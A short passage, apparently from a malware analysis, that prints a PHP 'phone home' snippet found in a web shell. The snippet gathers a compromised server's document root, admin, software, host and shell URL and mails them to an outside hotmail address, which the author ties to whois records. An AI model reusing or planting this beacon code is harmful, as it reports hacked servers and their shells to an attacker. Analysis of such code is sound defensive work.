## Phone Home

The code has a piece of PHP that phones home:

	<?php
	$kime="amadeus155@hotmail.com";
	$baslik="SadrazaM Server Avcisi V1.0";
	$EL_MuHaMMeD="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
	$EL_MuHaMMeD.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
	$EL_MuHaMMeD.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
	$EL_MuHaMMeD.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
	$EL_MuHaMMeD.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
	mail($kime, $baslik, $EL_MuHaMMeD);
	?>

This is the same email address as in the `whois` info for the IP address.
